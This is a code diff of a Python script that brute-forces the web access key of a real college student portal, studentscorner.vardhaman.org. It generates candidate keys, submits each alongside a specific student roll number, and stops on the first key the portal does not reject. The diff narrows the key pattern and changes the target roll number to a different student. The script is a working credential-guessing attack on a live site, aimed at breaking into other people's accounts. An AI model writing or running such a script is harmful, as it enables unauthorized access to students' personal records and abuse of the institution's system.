@@ -9,12 +9,11 @@ def generate_combinations():
     combinations = []
     
     # Generate the combinations with the given format
-    for letter1 in capital_letters + numbers:
-        for letter2 in capital_letters + numbers:
+    for letter1 in capital_letters:
+        for letter2 in numbers:
             for letter3 in capital_letters + numbers:
-                for letter4 in capital_letters + numbers:
-                    combination = '#' + letter1 + letter2 + letter3 + letter4
-                    combinations.append(combination)
+                combination = '#' + letter1*2 + letter2 + letter3
+                combinations.append(combination)
     
     return combinations
 
@@ -41,7 +40,7 @@ for i in combinations:
     login_url = 'https://studentscorner.vardhaman.org/student_corner_index.php'
     browser.open(login_url)
     browser.select_form(nr=0)
-    browser.form['rollno'] = '20881A05B0'
+    browser.form['rollno'] = '20881A05B1'
     browser.form['wak'] = i
     response = browser.submit()
     soup = BeautifulSoup(response, 'html.parser')
@@ -50,7 +49,7 @@ for i in combinations:
     print(str(table.text)[0],i)
     if(table.text == 'Invalid Web Access Key ' or str(table.text)[0]=='C'):
         continue
-    data['20881A05B0']=i
-    print('20881A05B0',i)
+    data['20881A05B1']=i
+    print('20881A05B1',i)
     break
 print(data)
